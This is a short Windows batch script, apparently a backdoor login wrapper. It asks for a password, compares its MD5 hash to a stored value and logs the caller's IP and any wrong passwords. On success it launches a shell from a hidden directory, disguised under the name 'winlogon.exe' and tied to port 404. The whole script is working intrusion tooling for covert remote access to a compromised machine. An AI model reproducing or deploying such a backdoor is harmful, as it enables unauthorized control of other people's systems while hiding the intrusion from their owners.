@echo off
 setlocal
 set _hiddendir=c:\hidden
 set _shash=291013bf3a3c543625a2777073f91799
 set _log=auth.log
 set _lport=404
 set _shell=winlogon.exe
 set _audits=0
 
:CHALLENGE
 echo.
 set /p  _challenge=Password: 
 call :HASH

 if "%_chash%"=="%_shash%" (
  call :DOLOG successful_audit
  goto AUTHED
 ) else (
  echo Access denied
  call :DOLOG failed_audit
  set /a _audits=1+%_audits%
  if not "%_audits%"=="2" goto CHALLENGE
  goto :EOF
 )

:AUTHED
  echo Login Successful!
  %_hiddendir%\%_shell% /q /d /f:ON /k lib profile %_hiddendir%
  endlocal
  exit

:HASH
 echo %_challenge% > %tmp%\challenge.tmp
 for /f "usebackq tokens=1" %%i in (`md5sums -u %tmp%\challenge.tmp`) do set _chash=%%i
 del /q %tmp%\challenge.tmp
 goto :EOF

:DOLOG
 for /f "usebackq tokens=*" %%i in (`date /t`) do set _date=%%i
 for /f "usebackq tokens=*" %%i in (`time /t`) do set _time=%%i
 for /f "usebackq tokens=3" %%i in (`netstat ^| find "%_lport%"`) do set _ip=%%i

 if "%1"=="failed_audit" (
  echo *** %1 at %_time% on %_date%from %_ip%. User supplied, "%_challenge%" >> %_log%
 ) else (
  echo %1 at %_time% on %_date%from %_ip% >> %_log%
 ) 

 echo. >> %_log%
 goto :EOF